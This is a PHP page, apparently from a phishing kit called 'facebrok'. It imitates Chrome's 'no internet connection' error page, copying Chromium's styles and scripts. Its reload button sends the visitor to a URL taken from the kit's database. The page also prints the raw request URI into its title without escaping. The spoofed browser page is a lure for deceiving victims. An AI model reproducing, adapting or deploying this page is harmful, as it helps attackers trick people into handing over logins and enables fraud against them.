<?php
// facebrok
error_reporting(E_ALL ^ E_NOTICE);
include("croak/config.php");
// Language--------------------------------
$lang=$_POST['idio'];
if ($lang=='')
{ 
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
// Check URL 
$sql=mysql_query("SELECT * FROM methods WHERE id=3") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$lang=''.$row['value'].''; 
// -- END --
} else {$lang=$lang;}
include("lang.php");
// Connections ----------------------
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
// Check URL 
$sql=mysql_query("SELECT * FROM methods WHERE id=1") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$url=''.$row['value'].''; 
$name="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
// -- END --
?>

<html i18n-values="dir:textdirection" dir="ltr"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0,
                                 maximum-scale=1.0, user-scalable=no">
  <title i18n-content="title"><?php echo"$name";?>stype?lo&jlou=AfdTGlz3ZWxSzf8MvpDhAIb5PxZeaux5ZFb_V8t7V95Xz3PQA8hT0DaxWa0UjyIbgmAUaoHRuqkittaecTEx2tKXN4zxk2ptBDq</title>
  <style>/* Copyright 2013 The Chromium Authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file. */

body {
  background-color: #E6E6E6;
  font-family: Helvetica, Arial, sans-serif;
  font-size: 10pt;
  margin: 50px 40px 20px 40px;
}

#main-frame-error {
  margin: auto;
  max-width: 540px;
  min-width: 200px;
}

/* Don't use the main frame div when the error is in a subframe. */
html[subframe] #main-frame-error {
  display: none;
}

/* Don't use the subframe error div when the error is in a main frame. */
html:not([subframe]) #sub-frame-error {
  display: none;
}

#box {
  background-color: #fbfbfb;
  border: 1px solid #AAA;
  border-bottom: 1px solid #888;
  border-radius: 3px;
  color: black;
/* Not done on mobile for performance reasons. */
  box-shadow: 0px 2px 2px #AAA;
}

#diagnose-button {
  margin-top: 20px;
  margin-bottom: 10px;
  -webkit-margin-start: 0px;
}

#content-top #buttons,
#content-top h1 {
  color: #666;
  margin: 10px 0px 25px 0px;
  font-weight: normal;
  font-size: 1.5em;
  text-align: center;
}

h2 {
  color: #666;
  font-size: 1.2em;
  font-weight: normal;
  margin: 10px 0;
}

a {
  color: #15c;
  text-decoration: none;
}

.icon {
  -webkit-user-select: none;
}

.icon-generic {
  /**
   * Can't access chrome://theme/IDR_ERROR_NETWORK_GENERIC from an untrusted
   * renderer process, so embed the resource manually.
   */
  content: -webkit-image-set(
      url('face.png') 1x,
      url('face2.php') 2x);
}

.icon-offline {
  content: -webkit-image-set(
      url('old.png') 1x,
      url('old2.png') 2x);
}

#content-top {
  margin: 20px 20px 20px 25px;
}

#help-box-outer {
  overflow: hidden;
  -webkit-transition: height ease-in 218ms;
}

#help-box-inner {
  background-color: #f9f9f9;
  border-top: 1px solid #EEE;
  color: #444;
  padding: 25px 20px;
  text-align: start;
}

#suggestions {
  margin-top: 15px;
}

#sub-frame-error-details {
  color: #8F8F8F;
/* Not done on mobile for performance reasons. */
  text-shadow: 0 1px 0 rgba(255,255,255,0.3);
}

[jscontent=failedUrl] {
  overflow-wrap: break-word;
}

button {
  border: 1px solid rgba(0, 0, 0, 0.25);
  border-radius: 2px;
  color: #444;
  margin: 0px 5px;
  min-height: 29px;
  min-width: 65px;
  -webkit-user-select: none;
  padding: 8px 13px;
/* iOS does not support linear-gradient without a prefix. */
  background-image: -webkit-linear-gradient(#ededed, #ededed 38%, #dedede);
  text-shadow: 0 1px 0 rgb(240, 240, 240);

/* Not done on mobile for performance reasons. */
  box-shadow: 0 1px 0 rgba(0, 0, 0, 0.08), inset 0 1px 2px rgba(255, 255, 255, 0.75);
}

button:hover {
  border: 1px solid rgba(0, 0, 0, 0.3);
  color: #000;
background-image: -webkit-linear-gradient(#f0f0f0, #f0f0f0 38%, #e0e0e0);

box-shadow: 0 1px 0 rgba(0, 0, 0, 0.12), inset 0 1px 2px rgba(255, 255, 255, 0.95);
}

button:active {
  border: 1px solid rgba(0, 0, 0, 0.3);
  color: #444;
background-image: -webkit-linear-gradient(#e7e7e7, #e7e7e7 38%, #d7d7d7);

box-shadow: none;
}

#reload-button {
  color: #fff;
background-image: -webkit-linear-gradient(#5d9aff, #5d9aff 38%, #5891f0);
  border: 1px solid rgba(45, 102, 195, 1);
  text-shadow: 0 1px 0 rgba(0,0,0,0.5);

box-shadow: 0 1px 0 rgba(0, 0, 0, 0.15), inset 0 1px 2px rgba(255, 255, 255, 0.2);
}

#reload-button:hover {
background-image: -webkit-linear-gradient(#659efd, #659efd 38%, #6097f1);
  border: 1px solid rgba(45, 102, 195, 1);
box-shadow: 0 1px 0 rgba(0, 0, 0, 0.25), inset 0 1px 2px rgba(255, 255, 255, 0.2);
}

#reload-button:active {
background-image: -webkit-linear-gradient(#6095ed, #6095ed 38%, #6095ed);
  border: 1px solid rgb(38, 84, 160);

box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.1);
}

.hidden {
  display: none;
}

.suggestions {
  margin-top: 18px;
}

.suggestion-header {
  font-weight: bold;
  margin-bottom: 4px;
}

.suggestion-body {
  color: #777;
}

.error-code {
  color: #A0A0A0;
  margin-top: 15px;
}

/* Increase line height at higher resolutions. */
@media (min-width: 641px) and (min-height: 641px) {
  #help-box-inner {
    line-height: 18px;
  }
}

/* Decrease padding at low sizes. */
@media (max-width: 640px), (max-height: 640px) {
  body {
    margin: 15px;
  }
  h1 {
    margin: 10px 0px 15px 0px;
  }
  #content-top {
    margin: 15px;
  }
  #help-box-inner {
    padding: 20px;
  }
  .suggestions {
    margin-top: 10px;
  }
  .suggestion-header {
    margin-bottom: 0px;
  }
  .error-code {
    margin-top: 10px;
  }
}

/* Don't allow overflow when in a subframe. */
html[subframe] body {
  overflow: hidden;
}

#sub-frame-error {
  -webkit-align-items: center;
  background-color: #DDD;
  display: -webkit-flex;
  -webkit-flex-flow: column;
  height: 100%;
  -webkit-justify-content: center;
  left: 0px;
  position: absolute;
  top: 0px;
  width: 100%;
}

#sub-frame-error:hover {
  background-color: #EEE;
}

#sub-frame-error-details {
  margin: 0 10px;
  visibility: hidden;
}

/* Show details only when hovering. */
#sub-frame-error:hover #sub-frame-error-details {
  visibility: visible;
}

/* If the iframe is too small, always hide the error code. */
/* TODO(mmenke): See if overflow: no-display works better, once supported. */
@media (max-width: 200px), (max-height: 95px) {
  #sub-frame-error-details {
    display: none;
  }
}
</style>
  <script>// Copyright 2013 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

function toggleHelpBox() {
  var helpBoxOuter = document.getElementById('help-box-outer');
  helpBoxOuter.classList.toggle('hidden');
  var moreLessButton = document.getElementById('more-less-button');
  if (helpBoxOuter.classList.contains('hidden')) {
    moreLessButton.innerText = moreLessButton.moreText;
  } else {
    moreLessButton.innerText = moreLessButton.lessText;
  }
}

function diagnoseErrors() {
  var extension_id = "idddmepepmjcgiedknnmlbadcokidhoa";
  var diagnose_frame = document.getElementById('diagnose-frame');
  diagnose_frame.innerHTML =
      '<iframe src="chrome-extension://' + extension_id +
      '/index.html"></iframe>';
}

// Subframes use a different layout but the same html file.  This is to make it
// easier to support platforms that load the error page via different
// mechanisms (Currently just iOS).
if (window.top.location != window.location)
  document.documentElement.setAttribute('subframe', '');

// Re-renders the error page using |strings| as the dictionary of values.
// Used by NetErrorTabHelper to update DNS error pages with probe results.
function updateForDnsProbe(strings) {
  i18nTemplate.process(document, strings);
  var context = new JsEvalContext(strings);
  jstProcess(context, document.getElementById('t'));
}

// Given the classList property of an element, adds an icon class to the list
// and removes the previously-
function updateIconClass(classList, newClass) {
  var oldClass;

  if (classList.hasOwnProperty('last_icon_class')) {
    oldClass = classList['last_icon_class']
    if (oldClass == newClass)
      return;
  }

  classList.add(newClass);
  if (oldClass !== undefined)
    classList.remove(oldClass);

  classList['last_icon_class'] = newClass;
}


</script>

</head>
<body id="t" jstcache="0">
  <div id="main-frame-error" jstcache="0">
    <div id="box" jstcache="0">
      <div id="content-top" jstcache="0">
        <h1 jstcache="0">
          <div jstcache="0">
            <img class="icon icon-offline" jseval="updateIconClass(this.classList, iconClass)" jstcache="9">
          </div>
          <span i18n-content="heading" jstcache="0"><?php echo"$bb";?></span>
        </h1>
        <div id="buttons" jstcache="0">
          <button id="reload-button" jsselect="reload" jsvalues=".url:reloadUrl" jscontent="msg" jstcache="3"><a href="<?php echo"$url";?>"x<a style="color:white"><?php echo"$cc";?></a></c></button>
          <button id="more-less-button" onclick="toggleHelpBox()" jsdisplay="more" jsvalues=".moreText:more; .lessText:less;" jscontent="more" jstcache="4"><?php echo"$dd";?></button>
        </div>
      </div>
       <!-- Outer and inner divs are needed both for margins and sizing. -->
      <div id="help-box-outer" class="hidden" jstcache="0">
        <div id="help-box-inner" jstcache="0">
          <div jsselect="summary" jstcache="5">
            <span jsvalues=".innerHTML:msg" jstcache="10"><span jscontent="productName" jstcache="14"><?php echo"$ee";?></span>
          </div>
          <div class="suggestions" jsselect="suggestions" jstcache="6" jsinstance="0">
            <div class="suggestion-header" jsvalues=".innerHTML:header" jstcache="11"><?php echo"$ff";?></div>
            <div class="suggestion-body" jsvalues=".innerHTML:body" jstcache="12"><?php echo"$gg";?></div>
          </div><div class="suggestions" jsselect="suggestions" jstcache="6" jsinstance="*1">
            <div class="suggestion-header" jsvalues=".innerHTML:header" jstcache="11"><?php echo"$hh";?></div>
            <div class="suggestion-body" jsvalues=".innerHTML:body" jstcache="12"><?php echo"$ii";?></div>
          </div>
          <button id="diagnose-button" onclick="diagnoseErrors()" jscontent="diagnose" jsdisplay="diagnose" jstcache="7" style="display: none;"></button>
          <div id="diagnose-frame" class="hidden" jstcache="0"></div>
          <div class="error-code" jscontent="errorCode" jstcache="8"><?php echo"$ff";?>: DNS_PROBE_FINISHED_NO_INTERNET</div>
        </div>
      </div>
    </div>
  </div>
  <div id="sub-frame-error" jstcache="0">
    <!-- Show details when hovering over the icon, in case the details are
         hidden because they're too large. -->
    <img class="icon icon-offline" jseval="updateIconClass(this.classList, iconClass)" jsvalues=".title:errorDetails" jstcache="1" title="Se ha perdido la conexión a Internet.">
    <div id="sub-frame-error-details" jsvalues=".innerHTML:errorDetails" jstcache="2">Se ha perdido la conexión a Internet.</div>
  </div>


<script jstcache="0">// Copyright (c) 2010 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

/**
 * NOTE: The use of this file is deprecated. Use i18n_template2.js instead.
 *
 * @fileoverview This is a simple template engine inspired by JsTemplates
 * optimized for i18n.
 *
 * It currently supports two handlers:
 *
 *   * i18n-content which sets the textContent of the element
 *
 *     <span i18n-content="myContent"></span>
 *     i18nTemplate.process(element, {'myContent': 'Content'});
 *
 *   * i18n-values is a list of attribute-value or property-value pairs.
 *     Properties are prefixed with a '.' and can contain nested properties.
 *
 *     <span i18n-values="title:myTitle;.style.fontSize:fontSize"></span>
 *     i18nTemplate.process(element, {
 *       'myTitle': 'Title',
 *       'fontSize': '13px'
 *     });
 */

var i18nTemplate = (function() {
  /**
   * This provides the handlers for the templating engine. The key is used as
   * the attribute name and the value is the function that gets called for every
   * single node that has this attribute.
   * @type {Object}
   */
  var handlers = {
    /**
     * This handler sets the textContent of the element.
     */
    'i18n-content': function(element, attributeValue, obj) {
      element.textContent = obj[attributeValue];
    },

    /**
     * This handler adds options to a select element.
     */
    'i18n-options': function(element, attributeValue, obj) {
      var options = obj[attributeValue];
      options.forEach(function(values) {
        var option = typeof values == 'string' ? new Option(values) :
            new Option(values[1], values[0]);
        element.appendChild(option);
      });
    },

    /**
     * This is used to set HTML attributes and DOM properties,. The syntax is:
     *   attributename:key;
     *   .domProperty:key;
     *   .nested.dom.property:key
     */
    'i18n-values': function(element, attributeValue, obj) {
      var parts = attributeValue.replace(/\s/g, '').split(/;/);
      for (var j = 0; j < parts.length; j++) {
        var a = parts[j].match(/^([^:]+):(.+)$/);
        if (a) {
          var propName = a[1];
          var propExpr = a[2];

          // Ignore missing properties
          if (propExpr in obj) {
            var value = obj[propExpr];
            if (propName.charAt(0) == '.') {
              var path = propName.slice(1).split('.');
              var object = element;
              while (object && path.length > 1) {
                object = object[path.shift()];
              }
              if (object) {
                object[path] = value;
                // In case we set innerHTML (ignoring others) we need to
                // recursively check the content
                if (path == 'innerHTML') {
                  process(element, obj);
                }
              }
            } else {
              element.setAttribute(propName, value);
            }
          } else {
            console.warn('i18n-values: Missing value for "' + propExpr + '"');
          }
        }
      }
    }
  };

  var attributeNames = [];
  for (var key in handlers) {
    attributeNames.push(key);
  }
  var selector = '[' + attributeNames.join('],[') + ']';

  /**
   * Processes a DOM tree with the {@code obj} map.
   */
  function process(node, obj) {
    var elements = node.querySelectorAll(selector);
    for (var element, i = 0; element = elements[i]; i++) {
      for (var j = 0; j < attributeNames.length; j++) {
        var name = attributeNames[j];
        var att = element.getAttribute(name);
        if (att != null) {
          handlers[name](element, att, obj);
        }
      }
    }
  }

  return {
    process: process
  };
})();
</script><script jstcache="0">// Copyright (c) 2012 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

(function(){var i=null;function k(){return Function.prototype.call.apply(Array.prototype.slice,arguments)}function l(a,b){var c=k(arguments,2);return function(){return b.apply(a,c)}}function m(a,b){var c=new n(b);for(c.f=[a];c.f.length;){var e=c,d=c.f.shift();e.g(d);for(d=d.firstChild;d;d=d.nextSibling)d.nodeType==1&&e.f.push(d)}}function n(a){this.g=a}function o(a){a.style.display=""}function p(a){a.style.display="none"};var q=":",r=/\s*;\s*/;function s(){this.i.apply(this,arguments)}s.prototype.i=function(a,b){if(!this.a)this.a={};if(b){var c=this.a,e=b.a,d;for(d in e)c[d]=e[d]}else for(c in d=this.a,e=t,e)d[c]=e[c];this.a.$this=a;this.a.$context=this;this.d=typeof a!="undefined"&&a!=i?a:"";if(!b)this.a.$top=this.d};var t={$default:i},u=[];function v(a){for(var b in a.a)delete a.a[b];a.d=i;u.push(a)}function w(a,b,c){try{return b.call(c,a.a,a.d)}catch(e){return t.$default}}
function x(a,b,c,e){if(u.length>0){var d=u.pop();s.call(d,b,a);a=d}else a=new s(b,a);a.a.$index=c;a.a.$count=e;return a}var y="a_",z="b_",A="with (a_) with (b_) return ",D={};function E(a){if(!D[a])try{D[a]=new Function(y,z,A+a)}catch(b){}return D[a]}function F(a){for(var b=[],a=a.split(r),c=0,e=a.length;c<e;++c){var d=a[c].indexOf(q);if(!(d<0)){var f;f=a[c].substr(0,d).replace(/^\s+/,"").replace(/\s+$/,"");d=E(a[c].substr(d+1));b.push(f,d)}}return b};var G="jsinstance",H="jsts",I="*",J="div",K="id";function L(){}var M=0,N={0:{}},P={},Q={},R=[];function S(a){a.__jstcache||m(a,function(a){T(a)})}var U=[["jsselect",E],["jsdisplay",E],["jsvalues",F],["jsvars",F],["jseval",function(a){for(var b=[],a=a.split(r),c=0,e=a.length;c<e;++c)if(a[c]){var d=E(a[c]);b.push(d)}return b}],["transclude",function(a){return a}],["jscontent",E],["jsskip",E]];
function T(a){if(a.__jstcache)return a.__jstcache;var b=a.getAttribute("jstcache");if(b!=i)return a.__jstcache=N[b];for(var b=R.length=0,c=U.length;b<c;++b){var e=U[b][0],d=a.getAttribute(e);Q[e]=d;d!=i&&R.push(e+"="+d)}if(R.length==0)return a.setAttribute("jstcache","0"),a.__jstcache=N[0];var f=R.join("&");if(b=P[f])return a.setAttribute("jstcache",b),a.__jstcache=N[b];for(var h={},b=0,c=U.length;b<c;++b){var d=U[b],e=d[0],g=d[1],d=Q[e];d!=i&&(h[e]=g(d))}b=""+ ++M;a.setAttribute("jstcache",b);N[b]=
h;P[f]=b;return a.__jstcache=h}function V(a,b){a.h.push(b);a.k.push(0)}function W(a){return a.c.length?a.c.pop():[]}
L.prototype.e=function(a,b){var c=X(b),e=c.transclude;if(e)(c=Y(e))?(b.parentNode.replaceChild(c,b),e=W(this),e.push(this.e,a,c),V(this,e)):b.parentNode.removeChild(b);else if(c=c.jsselect){var c=w(a,c,b),d=b.getAttribute(G),f=!1;d&&(d.charAt(0)==I?(d=parseInt(d.substr(1),10),f=!0):d=parseInt(d,10));var h=c!=i&&typeof c=="object"&&typeof c.length=="number",e=h?c.length:1,g=h&&e==0;if(h)if(g)d?b.parentNode.removeChild(b):(b.setAttribute(G,"*0"),p(b));else if(o(b),d===i||d===""||f&&d<e-1){f=W(this);
d=d||0;for(h=e-1;d<h;++d){var j=b.cloneNode(!0);b.parentNode.insertBefore(j,b);Z(j,c,d);g=x(a,c[d],d,e);f.push(this.b,g,j,v,g,i)}Z(b,c,d);g=x(a,c[d],d,e);f.push(this.b,g,b,v,g,i);V(this,f)}else d<e?(f=c[d],Z(b,c,d),g=x(a,f,d,e),f=W(this),f.push(this.b,g,b,v,g,i),V(this,f)):b.parentNode.removeChild(b);else c==i?p(b):(o(b),g=x(a,c,0,1),f=W(this),f.push(this.b,g,b,v,g,i),V(this,f))}else this.b(a,b)};
L.prototype.b=function(a,b){var c=X(b),e=c.jsdisplay;if(e){if(!w(a,e,b)){p(b);return}o(b)}if(e=c.jsvars)for(var d=0,f=e.length;d<f;d+=2){var h=e[d],g=w(a,e[d+1],b);a.a[h]=g}if(e=c.jsvalues){d=0;for(f=e.length;d<f;d+=2)if(g=e[d],h=w(a,e[d+1],b),g.charAt(0)=="$")a.a[g]=h;else if(g.charAt(0)=="."){for(var g=g.substr(1).split("."),j=b,O=g.length,B=0,$=O-1;B<$;++B){var C=g[B];j[C]||(j[C]={});j=j[C]}j[g[O-1]]=h}else g&&(typeof h=="boolean"?h?b.setAttribute(g,g):b.removeAttribute(g):b.setAttribute(g,""+
h))}if(e=c.jseval){d=0;for(f=e.length;d<f;++d)w(a,e[d],b)}e=c.jsskip;if(!e||!w(a,e,b))if(c=c.jscontent){if(c=""+w(a,c,b),b.innerHTML!=c){for(;b.firstChild;)e=b.firstChild,e.parentNode.removeChild(e);b.appendChild(this.j.createTextNode(c))}}else{c=W(this);for(e=b.firstChild;e;e=e.nextSibling)e.nodeType==1&&c.push(this.e,a,e);c.length&&V(this,c)}};function X(a){if(a.__jstcache)return a.__jstcache;var b=a.getAttribute("jstcache");if(b)return a.__jstcache=N[b];return T(a)}
function Y(a,b){var c=document;if(b){var e=c.getElementById(a);if(!e){var e=b(),d=H,f=c.getElementById(d);if(!f)f=c.createElement(J),f.id=d,p(f),f.style.position="absolute",c.body.appendChild(f);d=c.createElement(J);f.appendChild(d);d.innerHTML=e;e=c.getElementById(a)}c=e}else c=c.getElementById(a);return c?(S(c),c=c.cloneNode(!0),c.removeAttribute(K),c):i}function Z(a,b,c){c==b.length-1?a.setAttribute(G,I+c):a.setAttribute(G,""+c)};window.jstGetTemplate=Y;window.JsEvalContext=s;window.jstProcess=function(a,b){var c=new L;S(b);c.j=b?b.nodeType==9?b:b.ownerDocument||document:document;var e=l(c,c.e,a,b),d=c.h=[],f=c.k=[];c.c=[];e();for(var h,g,j;d.length;)h=d[d.length-1],e=f[f.length-1],e>=h.length?(e=c,g=d.pop(),g.length=0,e.c.push(g),f.pop()):(g=h[e++],j=h[e++],h=h[e++],f[f.length-1]=e,g.call(c,j,h))};
})()
</script><script jstcache="0">// Copyright (c) 2010 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Invoke the template engine previously loaded from i18n_template.js
i18nTemplate.process(document, templateData);
</script><script jstcache="0">var tp = document.getElementById('t');jstProcess(new JsEvalContext(templateData), tp);</script></body></html>